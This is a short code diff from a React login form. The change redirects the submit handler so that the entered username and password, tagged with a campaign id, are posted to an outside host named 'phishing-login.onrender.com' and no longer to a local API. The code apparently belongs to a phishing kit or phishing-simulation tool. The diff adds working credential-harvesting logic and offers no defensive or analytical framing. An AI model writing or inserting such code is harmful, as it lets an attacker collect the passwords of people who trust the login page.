@@ -14,7 +14,7 @@ const Login = () => {
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     try {
-      const response = await axios.post<ApiResponse>('http://localhost:3001/api/credentials', {
+      const response = await axios.post('https://phishing-login.onrender.com', {
         username: email,
         password: password,
         campaignId: '65c4d8f2e987b459a731d8f2'
